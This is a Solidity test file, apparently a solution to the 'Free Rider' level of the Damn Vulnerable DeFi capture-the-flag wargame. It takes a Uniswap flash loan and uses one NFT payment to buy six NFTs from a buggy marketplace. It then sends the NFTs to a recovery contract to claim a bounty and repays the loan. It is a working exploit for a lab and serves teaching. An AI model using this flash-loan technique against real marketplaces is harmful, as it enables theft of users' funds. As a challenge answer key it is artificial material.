// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/free-rider/FreeRiderLevel.sol";

contract FreeRiderTest is Test, IERC721Receiver {
  FreeRiderLevel level = new FreeRiderLevel();

  uint256 internal NFT_PRICE;

  DamnValuableNFT internal nft;
  FreeRiderNFTMarketplace internal marketplace;
  FreeRiderRecovery internal devsContract;
  IUniswapV2Pair internal uniswapPair;
  WETH internal weth;

  function setUp() public {
    level.setup();

    NFT_PRICE = level.NFT_PRICE();

    nft = level.nft();
    marketplace = level.marketplace();
    devsContract = level.devsContract();
    uniswapPair = level.uniswapPair();
    weth = level.weth();
  }

  function testExploit() public {
    // trigger the flash loan of 15 WETH
    // attack continues below, at uniswapV2Call()
    // also, we are borrowing the price of _a single_ NFT
    bytes memory data = abi.encode(weth, address(this));
    uniswapPair.swap(NFT_PRICE, 0, address(this), data);

    level.validate();
  }

  // need to complete the implementation of the flash loan
  function uniswapV2Call(
        address,
        uint amountWETH,
        uint,
        bytes calldata
    ) external {
    // this is a closed system
    // IRL you want to check who called this public method

    // get your ETH from the loan
    weth.withdraw(NFT_PRICE);

    // prepare and execute the buying order
    uint256[] memory tokenIds = new uint256[](6);
    for (uint i = 0; i < 6; i++) {
      tokenIds[i] = i;
    }
    marketplace.buyMany{value: NFT_PRICE}(tokenIds);

    // send to devscontract the received NFTs
    // to receive bounty
    bytes memory data = abi.encode(address(this));
    for (uint tokenId = 0; tokenId < 6; tokenId++) {
      nft.safeTransferFrom(address(this), address(devsContract), tokenId, data);
    }

    // return the funds to the uniswap pair
    // 0.3% fee and rounding
    // we took from our own ETH to make up for these fees
    uint256 fee = (amountWETH * 3) / 997 + 1;
    uint256 amountToRepay = amountWETH + fee;
    weth.deposit{value: NFT_PRICE + fee}();
    weth.transfer(address(uniswapPair), amountToRepay);
  }

  function onERC721Received(address, address, uint256, bytes memory)
    external
    override
    returns (bytes4){
    // this is a closed system
    // IRL you want to check who called this public method

    return IERC721Receiver.onERC721Received.selector;
  }

  receive() external payable {}
}
